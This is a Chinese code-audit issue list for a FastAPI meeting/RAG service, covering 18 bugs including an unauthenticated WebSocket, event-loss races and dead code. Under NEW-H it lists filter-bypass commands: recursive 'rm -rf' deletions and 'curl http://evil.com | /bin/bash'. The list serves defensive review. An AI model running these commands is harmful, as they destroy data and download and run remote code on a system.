# 代码审核问题清单 2026-07-01

> **历史注记** (2026-07-14): 本报告编写时 `nodes.py` 为单文件，现已拆分为 `nodes/` 包。行号引用映射：`nodes.py:656-664` → `nodes/evidence_check.py` 中的 `_collect_evidence()`；`nodes.py:554-558` → `nodes/cross_team.py` 中的 EVIDENCE_CHECK 跳过逻辑。

## 背景

对安全闭环 + 可靠性闭环 + 三大改进（WS 重连/RAG 邻居链/议题路由）的全部代码进行逐行审核，经交叉验证后确认 18 个问题。

## 严重（1）

### NEW-A: 认证中间件不保护 WebSocket

**位置**：`ws.py:22-23`

FastAPI 的 `@app.middleware("http")` 只拦截 HTTP 请求，不拦截 WebSocket 连接。`meeting_ws` 处理器直接 `await ws.accept()` 接受连接，不检查任何 token。即使设置了 `CONCLAVE_API_TOKEN`，所有 HTTP 端点受保护，但 WebSocket 完全开放。攻击者可通过 WebSocket 发送 control.signal（pause/abort/inject/loan），绕过所有 HTTP 认证。

## 中（6）

### NEW-B: neighbor_context 被检索但从未使用

**位置**：`nodes.py:656-664`

`retrieve()` 在 chunk dict 中添加 `neighbor_context` 字段，但 `_collect_evidence()` 只提取 `text`/`source`/`char_range`，完全忽略 `neighbor_context`。RAG 邻居链对证据质量零效果。

### NEW-C: standard 模式无条件跳过 evidence_check

**位置**：`state.py:158,162` + `nodes.py:554-558`

`_FLOW_SKIP_MAP["standard"] = {Stage.EVIDENCE_CHECK}` 是无条件跳过。cross_team_node 中的 `if` 判断是死代码（`_next_stage` 已跳过 EVIDENCE_CHECK，`nxt` 永远不等于 EVIDENCE_CHECK）。实际行为：standard 模式总是跳过 evidence_check，与文档"无冲突时自动跳过"矛盾。

### NEW-E: WS 回放与订阅竞态，可能永久丢失事件

**位置**：`ws.py:33-68`

回放流程：`replay()` → `for ev: await send` → `send(replay.done, last_seq)` → `subscribe()`。Step 1 和 Step 4 之间有多个 await 点。Runner 在这些 await 期间 publish 的事件不在 new_events 列表中，也不触发订阅者回调（Step 4 之后才注册），但反映在 `last_seq` 中。前端收到 `last_seq=N` 但缺少事件 N，重连用 `from_seq=N` 跳过——事件永久丢失。

### 修正1: Qdrant search 不恢复 prev_id/next_id

**位置**：`store.py:267-275`

`QdrantVectorStore.search()` 重建 Chunk 时没有读取 payload 中的 `prev_id`/`next_id`。Qdrant 模式下 `retrieve()` 拿到的 chunk 的 `prev_id` 永远为空，`expand_neighbors > 0 and chunk.prev_id` 条件永远为 False——邻居链在 Qdrant 模式下完全不生效。

### 修正2: 两个独立 _running_tasks 字典

**位置**：`runner.py:165-166` + `meetings.py:28`

`runner.py` 声明了 `_running_tasks` 和 `_tasks_lock`，但 `meetings.py` 声明了完全独立的 `_running_tasks`。runner.py 的是死代码——从未被任何代码引用或导入。实际使用的 `_running_tasks`（meetings.py）无任何锁保护。

### NEW-D: 健康检查同步 subprocess 阻塞事件循环

**位置**：`main.py:97-98`

`async def health()` 中调用 `subprocess.run(["docker", "info"], timeout=3)`。同步阻塞调用，最长阻塞事件循环 3 秒。并发请求期间其他请求挂起。

## 低-中（4）

### NEW-F: 前端丢弃 flow_plan.set 和 fallback_warning 事件

**位置**：`meetingReducer.ts:174`

`default: return store` 静默丢弃所有未显式处理的事件。`flow_plan.set` 和 `meeting.fallback_warning` 都不在处理列表中。后端正确发送了事件，前端收到但忽略。

### NEW-G: 文档首个 chunk 永远无邻居上下文

**位置**：`retriever.py:42`

`if expand_neighbors > 0 and chunk.prev_id:` 条件对文档第一个 chunk（`prev_id` 为空）永远为 False。如果证据出现在文档开头，邻居链不生效。

### NEW-H: 命令注入正则有具体绕过

**位置**：`middleware.py:75-87`

具体绕过：`rm -rf .` / `rm -rf *` / `rm --recursive --force /` / `curl http://evil.com | /bin/bash`。

### Issue 1: _states_lock 只保护字典读写

**位置**：`runner.py:169-178`

`get_state` 返回对象引用，调用方在锁外修改对象属性。asyncio 单线程事件循环内实际风险低，但缺少文档说明。

## 低（7）

### Issue 2: 事件总线同步 SQLite 写入阻塞 async

**位置**：`events.py:41-49`

`save_event` 是同步函数，在 async `publish` 中直接调用。

### Issue 3: CORS allow_credentials 边界情况

**位置**：`main.py:52`

显式设 `CONCLAVE_CORS_ORIGINS=*` 时 allow_credentials=True 违反 CORS 规范。

### Issue 6: cross_team_node 死代码

**位置**：`nodes.py:554-558`

standard 模式的 `if nxt == Stage.EVIDENCE_CHECK` 永远不触发。

### Issue 8: 事件 payload datetime 序列化无防御

**位置**：`db.py:165`

`json.dumps(payload, ensure_ascii=False)` 无 `default=str`。

### Issue 9: 循环内重复 import

**位置**：`events.py:117`

每次循环迭代都执行 `from datetime import datetime as _dt`。

### Issue 11: 健康检查 half_open 误标 degraded

**位置**：`main.py:112`

`all(v == "ok" or v == "closed")` 中 `half_open` 不匹配。

### Issue 12: 原文缓存只存 chunk.text

**位置**：`store.py:107-108`

`add_chunks` 中 `self._raw_texts[doc_id] = chunk.text` 只存第一个 chunk 的文本，非完整文档。
